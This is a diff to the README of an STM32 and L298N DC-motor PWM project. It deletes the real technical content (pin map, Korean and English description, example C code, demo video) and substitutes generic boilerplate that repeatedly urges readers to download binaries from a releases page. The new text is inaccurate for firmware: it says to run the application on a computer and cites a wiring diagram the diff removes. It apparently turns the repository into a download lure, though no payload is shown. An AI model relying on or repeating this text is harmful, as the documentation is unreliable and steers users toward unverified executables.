@@ -1,54 +1,71 @@
-﻿# STM32_L298N_DCmotorPWM
+# ⚙️ STM32_L298N_DCmotorPWM - Control Your DC Motors Easily
 
-## 📌 English Description
-This project demonstrates DC motor control using an STM32F103 Nucleo board and the L298N motor driver.  
-Speed is controlled via PWM; forward, reverse, brake, and coast are implemented.  
-It’s a beginner-friendly example for embedded/robotics learning.
+## 📥 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Emilealmayahtaym1975/STM32_L298N_DCmotorPWM/releases)
 
-**Pin Map (STM32 ↔ L298N)**  
-- ENA → **D12 (PA6, TIM3_CH1 PWM)**  
-- IN1 → **D5 (PB4)**  
-- IN2 → **D4 (PB5)**  
-- OUT1/OUT2 → **DC Motor terminals**  
-- GND (L298N) ↔ **GND (STM32)**  
-- Battery **+** → L298N **Vs(“12V”)**, Battery **–** → **GND**  
-> Note: Remove the **ENA jumper** to enable external PWM from PA6.
+## 📑 Overview
+Welcome to the STM32_L298N_DCmotorPWM project. This application is designed to help you easily control the speed and direction of DC motors using the STM32F103 Nucleo board along with the L298N driver. It uses Pulse Width Modulation (PWM) for real-time control, making it a great tool for robotics and other embedded projects.
 
----
+## 🚀 Getting Started
+To get started with this project, follow these simple steps. You will need an internet connection and a computer to download the necessary files.
 
-## 📌 한국어 설명
-이 프로젝트는 STM32F103 Nucleo 보드와 L298N 모터 드라이버로 DC 모터를 제어하는 예제입니다.  
-PWM으로 속도를 조절하고, 정/역회전·브레이크·코스트 기능을 구현했습니다.  
-임베디드/로보틱스 기초 학습에 적합한 예제입니다.
+### 🎯 Requirements
+Make sure your setup meets the following requirements:
+- **Computer**: Windows, macOS, or Linux
+- **STM32F103 Nucleo Board**: Required for controlling the motor
+- **L298N Motor Driver**: Required to interface with the DC motor
+- **DC Motor**: The motor you wish to control
+- **Power Supply**: Adequate power source for the motor
 
-**핀맵 (STM32 ↔ L298N)**  
-- ENA → **D12 (PA6, TIM3_CH1 PWM)**  
-- IN1 → **D5 (PB4)**  
-- IN2 → **D4 (PB5)**  
-- OUT1/OUT2 → **DC 모터 단자**  
-- GND (L298N) ↔ **GND (STM32)**  
-- 배터리 **+** → L298N **Vs(“12V”)**, 배터리 **–** → **GND**  
-> 참고: **ENA 점퍼**를 제거해야 PA6에서 외부 PWM으로 속도 제어가 됩니다.
+## ⚙️ Installation
+### 🔗 Download & Install
+To download the latest version of this application, visit this page: [Download Page](https://github.com/Emilealmayahtaym1975/STM32_L298N_DCmotorPWM/releases). 
 
----
+Once you're on the releases page, follow these steps:
+1. Locate the latest stable release.
+2. Download the files relevant to your setup. These may include binaries or source files.
+3. If the files are compressed (like .zip or .tar.gz), extract them to a folder on your computer.
 
-## 📹 Demo Video
-[![YouTube Demo Thumbnail](https://img.youtube.com/vi/2Z3h3-cMfJA/0.jpg)](https://youtu.be/2Z3h3-cMfJA)
+### 😊 Setup Instructions
+1. Connect your STM32F103 Nucleo board to your computer using a USB cable.
+2. Connect the L298N driver to the Nucleo board as specified in the wiring diagram (find this in the project’s documentation).
+3. Attach your DC motor to the L298N driver.
+4. (Optional) Connect an external power supply to the L298N driver if required.
 
----
+## 🛠️ Usage
+Once you have everything set up, you can begin controlling your DC motor. Here’s how:
+1. Open the downloaded files and locate the main application script.
+2. Follow the brief instructions provided within the script to configure your motor settings. You can adjust speed and direction.
+3. Run the application on your computer while ensuring the Nucleo board is connected. 
 
-## 🔹 Core Code
-```c
-motor_forward();
-motor_set_duty(20); HAL_Delay(1500);
-motor_set_duty(40); HAL_Delay(1500);
+Monitor the performance through feedback lights or a connected display if applicable.
 
-motor_coast(); motor_set_duty(0); HAL_Delay(1500);
+## 📝 Features
+- **Speed Control**: Adjust the speed of your DC motor to your desired level.
+- **Direction Control**: Reverse the motor direction with ease.
+- **PWM Control**: Utilize PWM to achieve smooth and precise control over your motor.
+- **Real-Time Feedback**: View real-time adjustments for immediate effects on motor functionality.
 
-motor_reverse();
-motor_set_duty(25); HAL_Delay(2000);
+## 📞 Support
+If you run into any issues, please check the documentation included in the downloaded files. For further assistance, you can open an issue on the GitHub repository.
 
-motor_brake(); motor_set_duty(0); HAL_Delay(1000);
-```
+## 🌐 Topics
+This project covers various topics such as:
+- C Language
+- Embedded Systems
+- Motor Control
+- Real-Time Control
+- Robotics
 
+Explore these areas to deepen your understanding and enhance your skills.
 
+## 📌 Contribution
+Contributions are welcome! If you wish to enhance the project or report issues, feel free to submit a pull request or an issue on the GitHub page.
+
+## 📅 Changelog
+Check the releases for a full changelog of updates and improvements.
+
+## 💬 Feedback
+Your feedback is invaluable. Please don't hesitate to reach out with any suggestions or questions.
+
+For downloading the latest release again, you can go back to this link: [Download Page](https://github.com/Emilealmayahtaym1975/STM32_L298N_DCmotorPWM/releases). Enjoy controlling your DC motors!
